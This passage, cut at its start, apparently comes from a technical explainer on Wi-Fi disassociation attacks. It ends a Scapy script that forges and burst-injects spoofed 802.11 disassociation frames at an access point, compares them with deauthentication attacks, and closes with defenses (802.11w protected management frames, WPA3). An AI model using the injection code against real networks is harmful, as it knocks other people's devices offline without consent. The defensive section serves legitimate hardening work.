                  addr2="00:11:22:33:44:55",  # Target Corporate AP MAC
                  addr3="00:11:22:33:44:55")  # BSSID Identifier
# 3. Define the Disassociation payload, appending the required Reason Code
# Reason 6 = Disassociated because past station is leaving or has left the BSS
payload_layer = Dot11Disas(reason=6)
# 4. Construct and burst inject the frame out of the wireless interface
disas_packet = radio_tap / mac_layer / payload_layer
sendp(disas_packet, iface="wlan0mon", count=25, inter=0.02)
```

#### **Technical Differences: Deauthentication vs. Disassociation**

| Technical Metric | Deauthentication (Subtype 12) | Disassociation (Subtype 10) |
| --- | --- | --- |
| **802.11 State Shift** | Reverts client entirely back to State 1 | Reverts client back to State 2 |
| **Client Recovery Path** | Full re-authentication sequence required | Lightweight re-association handshake loop |
| **Operational Profile** | High visibility / More disruptive to the OS | Lower visibility / Seamless automated recovery |
| **Primary Target Layer** | Complete session destruction / De-auth storms | Precise handshake driving / Roaming manipulation |

#### **Architectural Defensive Engineering**
Because disassociation frames happen purely over the airwaves at Layer 2, wired intrusion detection systems/`IDS` and endpoint detection and response/`EDR` solutions are entirely blind to them. Security teams must harden the wireless layer itself:
* **Enforced Protected Management Frames (PMF / 802.11w)**: This is the definitive technical control. When `802.11w` is set to required, management packets like Subtype 10 and 12 are cryptographically signed using a Robust Security Network Association/`RSNA` key. If an attacker injects a spoofed disassociation packet, the client validates the signature, detects that it is missing or invalid, and ignores the frame completely.
* **WPA3 Architectural Mandates**: The `WPA3` security standard mandates the use of `PMF` globally out-of-the-box. Upgrading local wireless infrastructure from legacy `WPA2-PSK` to `WPA3` fundamentally neutralizes raw frame-injection attacks.

